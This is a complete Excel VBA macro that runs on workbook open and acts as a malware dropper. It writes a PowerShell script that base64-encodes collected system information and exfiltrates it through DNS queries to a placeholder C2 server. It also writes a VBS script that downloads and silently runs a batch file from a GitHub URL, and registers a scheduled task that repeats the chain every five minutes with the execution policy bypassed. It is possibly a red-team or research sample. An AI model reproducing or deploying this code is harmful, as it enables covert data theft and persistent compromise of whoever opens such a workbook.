Private Sub Workbook_Open()
    'dns.ps1 is used to do DNS exfiltration
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    outFile = "%PUBLIC%\AppData\Local\Temp\Update\dns.txt"
    Set objFile = objFSO.CreateTextFile(outFile, True)

    objFile.WriteLine ("$lines = Get-Content %PUBLIC%\AppData\Local\Temp\Update\out.txt")
    objFile.WriteLine ("$dnsserver = ""%Your own C2 server%""")
    objFile.WriteLine ("foreach ($line in $lines){")
    objFile.WriteLine ("    echo ""Line: $line""")
    objFile.WriteLine ("    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)")
    objFile.WriteLine ("    $EncodedText =[Convert]::ToBase64String($Bytes)")
    objFile.WriteLine ("    echo ""EncodedText: $EncodedText""")
    objFile.WriteLine ("    $EncodedTextLength = $EncodedText.length")
    objFile.WriteLine ("    echo ""EncodedTextLength: $EncodedTextLength""")
    objFile.WriteLine ("    $i = 0")
    objFile.WriteLine ("    $pos = 0")
    objFile.WriteLine ("    $buff = 60")
    objFile.WriteLine ("    echo ""Start ===============================================""")
    objFile.WriteLine ("    Resolve-DnsName start.$dnsserver | out-null 2> $null")
    objFile.WriteLine ("    While ($i -le $EncodedTextLength){")
    objFile.WriteLine ("        $diff = $EncodedTextLength - $i")
    objFile.WriteLine ("        if($diff -lt $buff){$EncodedTextStream = $EncodedText.substring($i,$diff)}")
    objFile.WriteLine ("        if($diff -gt $buff-1){")
    objFile.WriteLine ("            $diff_end = $buff")
    objFile.WriteLine ("            $EncodedTextStreamSubString = $EncodedText.substring($i,$diff_end) ")
    objFile.WriteLine ("            $EncodedTextStream = $EncodedTextStreamSubString}")
    objFile.WriteLine ("        $EncodedTextStream = $EncodedTextStream -replace ""="",""00"" 2> $null")
    objFile.WriteLine ("        echo ""Full DNS: $EncodedTextStream.$dnsserver""")
    objFile.WriteLine ("        Resolve-DnsName ""$EncodedTextStream.$dnsserver"" | out-null 2> $null")
    objFile.WriteLine ("        $i = $i+$buff}")
    objFile.WriteLine ("    echo ""End ===============================================""")
    objFile.WriteLine ("    Resolve-DnsName end.$dnsserver | out-null 2> $null}")
    objFile.Close
    
    'write DNS exfiltration code into dns.txt, and then convert it into dns.ps1
    Dim Fso
    Set Fso = CreateObject("Scripting.FileSystemObject")
    Fso.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\dns.txt", "%PUBLIC%\AppData\Local\Temp\Update\dns.ps1"
    
    'BAT.bat file is used to collect system information
    'update.vbs is used to download BAT.bat, and execute BAT.bat and dns.ps1. after executing BAT.bat and dns.ps1, system information is stored in out.txt, and then dns.ps1 exfiltrates out.txt
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    outFile = "%PUBLIC%\AppData\Local\Temp\Update\update.txt"
    Set objFile = objFSO.CreateTextFile(outFile, True)

    objFile.WriteLine ("Set objWinHttp = CreateObject(""WinHttp.WinHttpRequest.5.1"")")
    objFile.WriteLine ("URL = ""https://raw.githubusercontent.com/Valerie-Yeh/DNSExfiltration-base64-/main/BAT.bat""")
    objFile.WriteLine ("objWinHttp.open ""GET"", URL, False")
    objFile.WriteLine ("objWinHttp.send""""")
    objFile.WriteLine ("SaveBinaryData ""%PUBLIC%\AppData\Local\Temp\Update\BAT.bat"",objWinHttp.responseBody")
    objFile.WriteLine ("Function SaveBinaryData(FileName, Data)")
    objFile.WriteLine ("Const adTypeText = 1")
    objFile.WriteLine ("Const adSaveCreateOverWrite = 2")
    objFile.WriteLine ("Dim BinaryStream")
    objFile.WriteLine ("Set BinaryStream = CreateObject(""ADODB.Stream"")")
    objFile.WriteLine ("BinaryStream.Type = adTypeText")
    objFile.WriteLine ("BinaryStream.Open")
    objFile.WriteLine ("BinaryStream.Write Data")
    objFile.WriteLine ("BinaryStream.SaveToFile FileName, adSaveCreateOverWrite")
    objFile.WriteLine ("End Function")
    objFile.WriteLine ("Set WShell = CreateObject(""Wscript.Shell"")")
    objFile.WriteLine ("cmd3 = ""%PUBLIC%\AppData\Local\Temp\Update\BAT.bat""")
    objFile.WriteLine ("WShell.Run cmd3, 0")
    objFile.WriteLine ("Set WShell = Nothing")
    objFile.WriteLine ("cmd4 = ""PowerShell -ExecutionPolicy Bypass -File %PUBLIC%\AppData\Local\Temp\Update\dns.ps1""")
    objFile.WriteLine ("CreateObject(""Wscript.Shell"").Run cmd4")
    objFile.Close
    
    'write code into update.txt, and then convert it to update.vbs
    Dim Fso1
    Set Fso1 = CreateObject("Scripting.FileSystemObject")
    Fso1.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\update.txt", "%PUBLIC%\AppData\Local\Temp\Update\update.vbs"
    
    
    'create taskscheduler to run update.vbs
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    outFile = "%PUBLIC%\AppData\Local\Temp\Update\taskscheduler.txt"
    Set objFile = objFSO.CreateTextFile(outFile, True)

    objFile.WriteLine ("$action = New-ScheduledTaskAction -Execute ""PowerShell.exe"" -Argument ""%PUBLIC%\AppData\Local\Temp\Update\update.vbs""")
    objFile.WriteLine ("$trigger = New-ScheduledTaskTrigger -Once -At 16:18pm -RepetitionInterval (New-TimeSpan -Minutes 5)")
    objFile.WriteLine ("Register-ScheduledTask -Action $action -Trigger $trigger -TaskPath ""updatetasks"" -TaskName ""UpdateTask"" -Description ""This task runs update.vbs""")
    objFile.Close
    
    Dim Fso2
    Set Fso2 = CreateObject("Scripting.FileSystemObject")
    Fso2.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\taskscheduler.txt", "%PUBLIC%\AppData\Local\Temp\Update\taskscheduler.ps1"
    
    cmd2 = "PowerShell -ExecutionPolicy Bypass -File %PUBLIC%\AppData\Local\Temp\Update\taskscheduler.ps1"
    CreateObject("Wscript.Shell").Run cmd2
    
End Sub
